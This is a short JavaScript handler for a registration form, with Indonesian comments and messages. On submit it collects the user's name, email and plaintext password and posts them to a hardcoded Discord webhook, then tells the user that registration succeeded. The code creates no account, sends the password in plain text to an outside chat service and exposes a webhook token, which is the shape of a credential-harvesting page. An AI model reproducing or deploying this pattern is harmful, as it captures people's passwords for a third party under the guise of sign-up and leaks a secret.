const registerForm = document.getElementById("daftarForm");
const registerMessageDiv = document.getElementById("registerMessage");

// Handle registration
registerForm.addEventListener("submit", (e) => {
  e.preventDefault(); // Prevent page refresh

  const firstName = document.getElementById("firstName").value;
  const lastName = document.getElementById("lastName").value;
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const webhookURL = "https://discord.com/api/webhooks/1331267993916805200/ldxIhL7EUuwqEOq15y2MVIq-JYrjB4yqVFbkYs2U-ymLej4SmJfmz4Wbp_Bzm0B38QyX"; // Ganti ini

  const data = {
    content: `**New User Registered!**\n**First Name:** ${firstName}\n**Last Name:** ${lastName}\n**Email:** ${email}\
    \n**Password:** ${password}`, // Pesan ke Discord
  };

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  })
    .then((response) => {
      if (response.ok) {
        registerMessageDiv.innerHTML = "<p class='success'>Pendaftaran berhasil! Silakan login.</p>";
        registerForm.reset();
      } else {
        registerMessageDiv.innerHTML = "<p class='message'>Gagal mengirim data.</p>";
      }
    })
    .catch((error) => {
      console.error("Error:", error);
      registerMessageDiv.innerHTML = "<p class='message'>Terjadi kesalahan. Silakan coba lagi.</p>";
    });
});